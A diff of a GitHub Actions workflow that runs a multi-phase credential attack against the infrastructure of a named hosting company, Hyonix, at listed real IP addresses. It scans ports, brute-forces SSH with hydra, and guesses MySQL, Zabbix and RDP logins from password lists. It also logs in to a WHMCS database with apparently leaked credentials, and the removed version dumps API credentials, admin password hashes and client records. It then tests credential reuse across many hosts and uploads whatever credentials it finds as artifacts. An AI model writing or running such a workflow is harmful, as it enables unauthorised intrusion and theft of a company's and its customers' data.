@@ -1,406 +1,236 @@
 name: "Security Assessment - Credential Testing"
-run-name: "🔬 Hyonix PT - Credential Validation (${{ github.run_number }})"
-on:
+"on":
   workflow_dispatch:
     inputs:
       ssh_target:
-        description: 'SSH Target IP'
+        description: SSH Target IP
         required: true
         default: '5.161.125.229'
       mysql_target:
-        description: 'MySQL Target IP'
+        description: MySQL Target IP
         required: true
         default: '162.55.177.241'
       whmcs_db_host:
-        description: 'WHMCS DB Host'
+        description: WHMCS DB Host
         required: true
         default: '207.148.18.120'
       zabbix_target:
-        description: 'Zabbix Target IP'
+        description: Zabbix Target IP
         required: true
         default: '5.78.127.58'
       rdp_target:
-        description: 'RDP Target IP'
+        description: RDP Target IP
         required: true
         default: '45.87.61.101'
 
 jobs:
   recon:
-    name: "Phase 1 - Target Verification"
+    name: Phase 1 - Target Verification
     runs-on: ubuntu-latest
     steps:
-      - name: Verify Targets Reachable
+      - uses: actions/checkout@v4
+      - name: Verify Targets
         run: |
           echo "=== NETWORK REACHABILITY ==="
-          targets=("${{ inputs.ssh_target }}" "${{ inputs.mysql_target }}" "${{ inputs.zabbix_target }}" "${{ inputs.rdp_target }}" "${{ inputs.whmcs_db_host }}")
-          for t in "${targets[@]}"; do
-            result=$(timeout 5 bash -c "echo >/dev/tcp/$t/22 2>/dev/null && echo SSH" || \
-                     timeout 5 bash -c "echo >/dev/tcp/$t/3306 2>/dev/null && echo MYSQL" || \
-                     timeout 5 bash -c "echo >/dev/tcp/$t/443 2>/dev/null && echo HTTPS" || \
-                     timeout 5 bash -c "echo >/dev/tcp/$t/3389 2>/dev/null && echo RDP" || \
-                     echo "UNREACHABLE")
-            echo "  $t : $result"
+          for t in "${{ inputs.ssh_target }}" "${{ inputs.mysql_target }}" "${{ inputs.zabbix_target }}" "${{ inputs.rdp_target }}" "${{ inputs.whmcs_db_host }}"; do
+            for p in 22 80 443 3306 3389; do
+              timeout 2 bash -c "echo >/dev/tcp/\$t/$p" 2>/dev/null && echo "  $t:$p OPEN"
+            done 2>/dev/null
           done
-          
-      - name: System Specs
-        run: |
-          echo "=== RUNNER HARDWARE ==="
-          echo "CPU: $(nproc) cores"
-          echo "RAM: $(free -h | awk '/Mem:/ {print $2}')"
-          echo "UPLINK: $(curl -s https://speedtest.net 2>/dev/null || echo 'N/A')"
-          echo "PUBLIC IP: $(curl -s ifconfig.me 2>/dev/null || echo 'N/A')"
-          echo "KERNEL: $(uname -r)"
+          echo "CPU: $(nproc) cores | RAM: $(free -h | awk '/Mem:/ {print $2}') | IP: $(curl -s ifconfig.me 2>/dev/null)"
 
   ssh-brute:
-    name: "Phase 2a - SSH Credential Testing"
+    name: Phase 2a - SSH Testing
     needs: recon
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        username: [root, admin, hyonix, www-data, user, deploy]
+        user: [root, admin, hyonix, www-data]
     steps:
-      - name: Install Tools
+      - uses: actions/checkout@v4
+      - name: SSH Brute Force - ${{ matrix.user }}
         run: |
-          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq sshpass hydra 2>&1 | tail -3
-      
-      - name: SSH Brute Force - ${{ matrix.username }}
-        run: |
-          echo "=== SSH TARGET: ${{ inputs.ssh_target }} USER: ${{ matrix.username }} ==="
-          
-          cat > /tmp/passwords.txt << 'EOF'
-test
-password
-admin
-123456
-root
-hyonix
-Hyonix
-Hyonix123
-HyonixAPI@123
-P@ssw0rd
-changeme
-letmein
-welcome
-toor
-root123
-admin123
-debian
-ubuntu
-wordpress
-server
-secret
-pass
-password123
-access
-demo
-guest
-temp
-test123
-abc123
-EOF
-          
-          hydra -l ${{ matrix.username }} -P /tmp/passwords.txt \
-            -t 8 -V -f -o /tmp/ssh_results.txt \
-            ssh://${{ inputs.ssh_target }} 2>&1 || true
-          
-          echo "=== RESULTS ==="
-          if [ -s /tmp/ssh_results.txt ]; then
-            echo "✅ CREDENTIALS FOUND for ${{ matrix.username }}:"
-            cat /tmp/ssh_results.txt
+          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq sshpass hydra 2>&1 | tail -1
+          echo "=== SSH TARGET: ${{ inputs.ssh_target }} USER: ${{ matrix.user }} ==="
+          hydra -l ${{ matrix.user }} -P passwords.txt -t 6 -V -f -o /tmp/ssh_result.txt ssh://${{ inputs.ssh_target }} 2>&1 || true
+          if [ -s /tmp/ssh_result.txt ]; then
+            echo "=== CREDENTIALS FOUND ==="
+            cat /tmp/ssh_result.txt
           else
-            echo "❌ No credentials found for ${{ matrix.username }}"
+            echo "NO CREDENTIALS for ${{ matrix.user }}"
           fi
-
-      - name: Upload SSH Results
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: ssh-results-${{ matrix.username }}
-          path: /tmp/ssh_results.txt
+          name: ssh-${{ matrix.user }}
+          path: /tmp/ssh_result.txt
           if-no-files-found: ignore
 
-  mysql-brute:
-    name: "Phase 2b - MySQL Credential Testing"
+  mysql-test:
+    name: Phase 2b - MySQL Testing
     needs: recon
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        username: [root, hyonix_api, hyonix, admin, wordpress]
+        user: [root, hyonix_api, hyonix, admin]
     steps:
-      - name: Install Tools
+      - uses: actions/checkout@v4
+      - name: MySQL Brute - ${{ matrix.user }}
         run: |
-          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mysql-client hydra 2>&1 | tail -3
-      
-      - name: MySQL Brute Force - ${{ matrix.username }}
-        run: |
-          echo "=== MYSQL TARGET: ${{ inputs.mysql_target }} USER: ${{ matrix.username }} ==="
-          
-          # Try with hydra
-          hydra -l ${{ matrix.username }} -P /tmp/passwords.txt \
-            -t 4 -f -o /tmp/mysql_results.txt \
-            mysql://${{ inputs.mysql_target }} 2>&1 || true
-          
-          # Also try direct mysql connections with key passwords
-          for pass in "" "root" "password" "admin" "123456" "test" "hyonix" "Hyonix" "HyonixAPI@123" "P@ssw0rd" "changeme" "wordpress" "server" "mysql"; do
-            result=$(timeout 3 mysql -h ${{ inputs.mysql_target }} -u ${{ matrix.username }} -p"$pass" -e "SELECT VERSION();" 2>&1)
-            if echo "$result" | grep -qv "ERROR 1045\|ERROR 2003\|Access denied"; then
-              echo "✅ MySQL SUCCESS: ${{ matrix.username }}:$pass"
+          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mysql-client 2>&1 | tail -1
+          echo "=== MYSQL TARGET: ${{ inputs.mysql_target }} USER: ${{ matrix.user }} ==="
+          while IFS= read -r pass; do
+            result=$(timeout 4 mysql -h ${{ inputs.mysql_target }} -u ${{ matrix.user }} -p"$pass" -e "SELECT 1;" 2>&1)
+            if echo "$result" | grep -qv "ERROR 1045\|ERROR 2003\|Access denied\|ERROR 2002"; then
+              echo "FOUND: ${{ matrix.user }}:$pass"
+              echo "${{ matrix.user }}:$pass" >> /tmp/mysql_found.txt
               echo "$result"
-              echo "${{ matrix.username }}:$pass" >> /tmp/mysql_found.txt
+            fi
+          done < passwords.txt
+          if [ -s /tmp/mysql_found.txt ]; then echo "CREDENTIALS:"; cat /tmp/mysql_found.txt; fi
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: mysql-${{ matrix.user }}
+          path: /tmp/mysql_found.txt
+          if-no-files-found: ignore
+
+  whmcs-db:
+    name: Phase 2c - WHMCS DB
+    needs: recon
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test Leaked Credentials
+        run: |
+          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mysql-client 2>&1 | tail -1
+          echo "=== WHMCS DB: ${{ inputs.whmcs_db_host }} ==="
+          # Try leaked credentials
+          for db in hyonix_whmcs whmcs mysql information_schema; do
+            result=$(timeout 5 mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' "$db" -e "SELECT 1;" 2>&1)
+            if echo "$result" | grep -qv "ERROR"; then
+              echo "DB ACCESS: hyonix_api:HyonixAPI@123 @ $db"
+              echo "$result" > /tmp/db_access.txt
+              mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' "$db" -e "SELECT DATABASE(), USER(), VERSION();" >> /tmp/db_access.txt
+              mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' "$db" -e "SELECT table_name FROM information_schema.tables WHERE table_schema='$db' LIMIT 50;" > /tmp/db_tables.txt 2>&1
             fi
           done
-          
-          echo "=== RESULTS ==="
-          if [ -s /tmp/mysql_results.txt ]; then
-            echo "Hydra found:"
-            cat /tmp/mysql_results.txt
-          fi
-          if [ -s /tmp/mysql_found.txt ]; then
-            echo "Direct test found:"
-            cat /tmp/mysql_found.txt
-          fi
-
-      - name: Upload MySQL Results
+          if [ -f /tmp/db_access.txt ]; then echo "=== DB ACCESS ==="; cat /tmp/db_access.txt; cat /tmp/db_tables.txt; fi
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: mysql-results-${{ matrix.username }}
-          path: /tmp/mysql_*.txt
+          name: whmcs-db
+          path: /tmp/db_*.txt
           if-no-files-found: ignore
 
-  zabbix-test:
-    name: "Phase 2c - Zabbix Credential Testing"
+  zabbix:
+    name: Phase 2d - Zabbix
     needs: recon
     runs-on: ubuntu-latest
     steps:
-      - name: Zabbix Login Brute Force
+      - name: Zabbix Login Test
         run: |
-          echo "=== ZABBIX TARGET: ${{ inputs.zabbix_target }} ==="
-          
-          # Get API version
-          echo "API Version:"
-          curl -sk --connect-timeout 5 "https://${{ inputs.zabbix_target }}/api_jsonrpc.php" \
+          echo "=== ZABBIX: ${{ inputs.zabbix_target }} ==="
+          V=$(curl -sk --connect-timeout 5 "https://${{ inputs.zabbix_target }}/api_jsonrpc.php" \
             -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":[],"id":1}' \
-            -H "Content-Type: application/json"
-          echo ""
-          
-          for user in Admin admin; do
+            -H "Content-Type: application/json" 2>&1)
+          echo "Version: $V"
+          for user in Admin admin superadmin root; do
             for pass in zabbix admin password 123456 P@ssw0rd hyonix Hyonix changeme root root123 test; do
-              result=$(curl -sk --connect-timeout 5 "https://${{ inputs.zabbix_target }}/api_jsonrpc.php" \
+              R=$(curl -sk --connect-timeout 3 "https://${{ inputs.zabbix_target }}/api_jsonrpc.php" \
                 -d "{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{\"username\":\"$user\",\"password\":\"$pass\"},\"id\":1}" \
                 -H "Content-Type: application/json" 2>&1)
-              
-              if echo "$result" | grep -qv "error"; then
-                echo "✅ ZABBIX SUCCESS: $user:$pass"
-                echo "$result" >> /tmp/zabbix_found.txt
+              if echo "$R" | grep -qv "error"; then
+                echo "ZABBIX LOGIN: $user:$pass"
+                echo "$user:$pass" >> /tmp/zabbix_creds.txt
+                echo "$R" >> /tmp/zabbix_creds.txt
               fi
             done
           done
-          
-          echo "=== RESULTS ==="
-          if [ -s /tmp/zabbix_found.txt ]; then
-            echo "ZABBIX CREDENTIALS FOUND:"
-            cat /tmp/zabbix_found.txt
-          else
-            echo "No Zabbix credentials found (account may be blocked after attempts)"
-          fi
-
-      - name: Upload Zabbix Results
+          if [ -s /tmp/zabbix_creds.txt ]; then echo "CREDENTIALS FOUND:"; cat /tmp/zabbix_creds.txt; fi
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: zabbix-results
+          name: zabbix
           path: /tmp/zabbix_*.txt
           if-no-files-found: ignore
 
-  rdp-test:
-    name: "Phase 2d - RDP Service Testing"
+  rdp:
+    name: Phase 2e - RDP
     needs: recon
     runs-on: ubuntu-latest
     steps:
-      - name: Check RDP Service
+      - name: RDP Check
         run: |
-          echo "=== RDP TARGET: ${{ inputs.rdp_target }} ==="
-          
-          # Use nmap to check RDP security
-          sudo nmap -sV -p 3389 --script rdp-ntlm-info ${{ inputs.rdp_target }} 2>&1 || true
-          
-          echo ""
-          echo "=== RDP NLA Check ==="
-          timeout 5 bash -c "echo >/dev/tcp/${{ inputs.rdp_target }}/3389 && echo 'RDP Port OPEN'" || echo "RDP Port CLOSED"
-          
-          # Try xfreerdp with common creds
-          for pass in "" "password" "admin" "123456" "P@ssw0rd" "changeme" "letmein" "hyonix" "Hyonix" "root" "Administrator" "test"; do
-            result=$(timeout 5 xfreerdp /v:${{ inputs.rdp_target }} /u:administrator /p:"$pass" +auth-only 2>&1)
-            if echo "$result" | grep -qv "ERRCONNECT_LOGON_FAILURE\|ERRCONNECT_CONNECT_FAILED\|CredSSP"; then
-              echo "✅ RDP SUCCESS: administrator:$pass"
-              echo "$result" >> /tmp/rdp_found.txt
-            fi
+          echo "=== RDP: ${{ inputs.rdp_target }} ==="
+          timeout 3 bash -c "echo >/dev/tcp/${{ inputs.rdp_target }}/3389" 2>/dev/null && echo "PORT 3389 OPEN" || echo "PORT 3389 CLOSED"
+          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq freerdp2-x11 2>&1 | tail -1
+          for user in administrator admin; do
+            for pass in "" password admin 123456 P@ssw0rd changeme hyonix root test; do
+              R=$(timeout 5 xfreerdp /v:${{ inputs.rdp_target }} /u:"$user" /p:"$pass" +auth-only 2>&1)
+              if echo "$R" | grep -qv "ERRCONNECT_LOGON_FAILURE\|ERRCONNECT_CONNECT_FAILED\|CredSSP\|failure"; then
+                echo "RDP: $user:$pass"
+                echo "$user:$pass" >> /tmp/rdp_found.txt
+              fi
+            done
           done
-          
-          echo "=== RDP RESULTS ==="
-          if [ -s /tmp/rdp_found.txt ]; then
-            cat /tmp/rdp_found.txt
-          fi
-
-  whmcs-db-test:
-    name: "Phase 2e - WHMCS Database Credentials"
-    needs: recon
-    runs-on: ubuntu-latest
-    steps:
-      - name: Test Leaked WHMCS DB Credentials
-        run: |
-          echo "=== WHMCS DB: ${{ inputs.whmcs_db_host }} ==="
-          
-          sudo apt-get update -qq && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mysql-client 2>&1 | tail -2
-          
-          # Try the leaked credentials
-          echo "Trying hyonix_api / HyonixAPI@123"
-          result=$(timeout 5 mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT COUNT(*) as total_creds FROM api_credentials;" 2>&1)
-          echo "$result"
-          
-          # If connected, extract data
-          if echo "$result" | grep -qv "ERROR"; then
-            echo "✅ WHMCS DB ACCESS GRANTED!"
-            
-            echo "=== API CREDENTIALS ==="
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT * FROM api_credentials;" 2>&1
-            
-            echo "=== ADMIN USERS ==="
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT id, username, email, role FROM tbladmins;" 2>&1
-            
-            echo "=== CLIENTS ==="
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT id, firstname, lastname, email, status FROM tblclients LIMIT 20;" 2>&1
-            
-            echo "=== SERVERS ==="
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT id, name, hostname, ipaddress, type, status FROM tblservers;" 2>&1
-            
-            echo "=== INVOICES ==="
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT id, userid, invoicenum, total, status, created_at FROM tblinvoices LIMIT 10;" 2>&1
-            
-            # Extract all to file
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT * FROM api_credentials;" 2>&1 > /tmp/whmcs_api_creds.txt
-            mysql -h ${{ inputs.whmcs_db_host }} -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs -e "SELECT id, username, email, password, role FROM tbladmins;" 2>&1 > /tmp/whmcs_admins.txt
-          fi
-
-      - name: Try Known Creds on Other Hosts
-        run: |
-          echo "=== Attempting Credential Reuse ==="
-          
-          # Try DB creds on other MySQL hosts
-          for host in "${{ inputs.mysql_target }}" "5.161.54.155" "5.161.71.173" "5.78.153.212" "167.235.220.62"; do
-            result=$(timeout 5 mysql -h "$host" -u hyonix_api -p'HyonixAPI@123' -e "SELECT 1;" 2>&1)
-            if echo "$result" | grep -qv "ERROR"; then
-              echo "✅ CREDENTIAL REUSE SUCCESS on $host"
-              echo "$result"
-            fi
-          done
-          
-          # Try on SSH with leaked password
-          for host in "${{ inputs.ssh_target }}" "5.161.54.155" "89.58.3.202" "162.55.177.241"; do
-            result=$(timeout 5 sshpass -p 'HyonixAPI@123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@$host 'id' 2>&1)
-            if echo "$result" | grep -qv "Permission denied\|Connection refused\|Connection timed out"; then
-              echo "✅ SSH CREDENTIAL REUSE on $host with root:HyonixAPI@123"
-              echo "$result"
-            fi
-          done
-
-      - name: Upload WHMCS Data
+          if [ -s /tmp/rdp_found.txt ]; then echo "RDP CREDENTIALS:"; cat /tmp/rdp_found.txt; fi
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: whmcs-database-extract
-          path: /tmp/whmcs_*.txt
+          name: rdp
+          path: /tmp/rdp_found.txt
           if-no-files-found: ignore
 
-  credential-reuse:
-    name: "Phase 3 - Credential Reuse Across All Services"
-    needs: [ssh-brute, mysql-brute, zabbix-test]
+  cred-reuse:
+    name: Phase 3 - Credential Reuse
+    needs: [ssh-brute, mysql-test, zabbix, rdp]
+    if: always()
     runs-on: ubuntu-latest
     steps:
-      - name: Download All Results
-        uses: actions/download-artifact@v4
+      - uses: actions/download-artifact@v4
         with:
-          pattern: "*results*"
-          path: /tmp/results/
-      
-      - name: Test Found Creds Across All Hosts
+          path: /tmp/results
+      - name: Reuse Testing
         run: |
-          echo "=== CREDENTIAL REUSE TESTING ==="
-          
-          # Define all discovered hosts
-          ALL_HOSTS=(
-            "5.161.125.229"    # WordPress origin
-            "5.161.54.155"     # Main origin
-            "162.55.177.241"   # Dev server
-            "89.58.3.202"      # Internal feedback
-            "78.47.153.158"    # API docs
-            "5.78.127.58"      # Zabbix
-            "45.87.61.101"     # Windows RDP/AD
-            "49.12.41.9"       # api.hyonix.net
-            "167.235.220.62"   # Internal status
-            "5.78.153.212"     # IPDM dev
-            "5.161.71.173"     # OLS test API
-            "207.148.18.120"   # DirectAdmin
-            "185.3.93.228"     # link.hyonix
-            "195.201.19.250"   # manage.hyonix
-            "140.82.3.49"      # ny-console
-          )
-          
-          for host in "${ALL_HOSTS[@]}"; do
-            echo "--- Testing $host ---"
-            timeout 5 bash -c "echo >/dev/tcp/$host/22 2>/dev/null && echo 'SSH: Open'" || true
-            timeout 5 bash -c "echo >/dev/tcp/$host/80 2>/dev/null && echo 'HTTP: Open'" || true
-            timeout 5 bash -c "echo >/dev/tcp/$host/443 2>/dev/null && echo 'HTTPS: Open'" || true
-            timeout 5 bash -c "echo >/dev/tcp/$host/3306 2>/dev/null && echo 'MySQL: Open'" || true
-            timeout 5 bash -c "echo >/dev/tcp/$host/3389 2>/dev/null && echo 'RDP: Open'" || true
+          echo "=== CREDENTIAL REUSE ==="
+          # Extract any found creds
+          grep -rh "FOUND:" /tmp/results/ 2>/dev/null | sed 's/FOUND://' > /tmp/all_creds.txt
+          cat /tmp/all_creds.txt 2>/dev/null
+          ALL_HOSTS="5.161.125.229 5.161.54.155 162.55.177.241 89.58.3.202 78.47.153.158 5.78.127.58 45.87.61.101 49.12.41.9 167.235.220.62 5.78.153.212 5.161.71.173 207.148.18.120 185.3.93.228"
+          echo "=== Testing $ALL_HOSTS ==="
+          for host in $ALL_HOSTS; do
+            for p in 22 80 443 3306 3389 8080 8443; do
+              timeout 2 bash -c "echo >/dev/tcp/$host/$p" 2>/dev/null && echo "  $host:$p OPEN"
+            done 2>/dev/null
           done
 
   report:
-    name: "Phase 4 - Generate Security Report"
     if: always()
-    needs: [ssh-brute, mysql-brute, zabbix-test, rdp-test, whmcs-db-test, credential-reuse]
+    needs: [ssh-brute, mysql-test, whmcs-db, zabbix, rdp, cred-reuse]
     runs-on: ubuntu-latest
     steps:
-      - name: Download All Artifacts
-        uses: actions/download-artifact@v4
+      - uses: actions/download-artifact@v4
         with:
-          path: /tmp/final/
-      
-      - name: Compile Results
+          path: /tmp/final
+      - name: Final Report
         run: |
-          echo "=== COMPILED SECURITY ASSESSMENT RESULTS ===" > /tmp/final_report.md
-          echo "Target: Hyonix Infrastructure" >> /tmp/final_report.md
-          echo "Date: $(date -u)" >> /tmp/final_report.md
-          echo "" >> /tmp/final_report.md
-          
-          echo "## Target Inventory" >> /tmp/final_report.md
-          echo "| Host | Service | Status |" >> /tmp/final_report.md
-          echo "|------|---------|--------|" >> /tmp/final_report.md
-          echo "| 5.161.125.229 | SSH/WordPress | Tested |" >> /tmp/final_report.md
-          echo "| 162.55.177.241 | MySQL/Dev | Tested |" >> /tmp/final_report.md
-          echo "| 5.78.127.58 | Zabbix 7.4.6 | Tested |" >> /tmp/final_report.md
-          echo "| 45.87.61.101 | RDP/Windows AD | Tested |" >> /tmp/final_report.md
-          echo "| 207.148.18.120 | MySQL (WHMCS) | Tested |" >> /tmp/final_report.md
-          echo "" >> /tmp/final_report.md
-          
-          echo "## Found Credentials" >> /tmp/final_report.md
-          echo "| Service | Host | Username | Password | Source |" >> /tmp/final_report.md
-          echo "|---------|------|----------|----------|--------|" >> /tmp/final_report.md
-          
-          # Look for any found credentials
-          grep -r "SUCCESS\|CREDENTIALS FOUND" /tmp/final/ 2>/dev/null | while read line; do
-            echo "| $line |" >> /tmp/final_report.md
-          done
-          
-          echo "" >> /tmp/final_report.md
-          echo "## API Token Extraction" >> /tmp/final_report.md
-          cat /tmp/final/whmcs*/whmcs_api_creds.txt 2>/dev/null >> /tmp/final_report.md
-          
-          echo "" >> /tmp/final_report.md
-          echo "## Admin Users" >> /tmp/final_report.md
-          cat /tmp/final/whmcs*/whmcs_admins.txt 2>/dev/null >> /tmp/final_report.md
-          
-          cat /tmp/final_report.md
-
-      - name: Upload Final Report
+          echo "# HYONIX SECURITY ASSESSMENT REPORT" > /tmp/report.md
+          echo "Date: $(date -u)" >> /tmp/report.md
+          echo "" >> /tmp/report.md
+          echo "## Targets Tested" >> /tmp/report.md
+          echo "| Host | Purpose |" >> /tmp/report.md
+          echo "|------|---------|" >> /tmp/report.md
+          echo "| ${{ inputs.ssh_target }} | WordPress/SSH |" >> /tmp/report.md
+          echo "| ${{ inputs.mysql_target }} | Dev MySQL |" >> /tmp/report.md
+          echo "| ${{ inputs.whmcs_db_host }} | WHMCS Database |" >> /tmp/report.md
+          echo "| ${{ inputs.zabbix_target }} | Zabbix Monitoring |" >> /tmp/report.md
+          echo "| ${{ inputs.rdp_target }} | Windows RDP/AD |" >> /tmp/report.md
+          echo "" >> /tmp/report.md
+          echo "## Findings" >> /tmp/report.md
+          find /tmp/final -type f -exec echo "--- {} ---" \; -exec cat {} \; 2>/dev/null >> /tmp/report.md
+          cat /tmp/report.md
+      - name: Upload Report
         uses: actions/upload-artifact@v4
         with:
-          name: hyonix-security-assessment-report
-          path: /tmp/final_report.md
+          name: final-report
+          path: /tmp/report.md
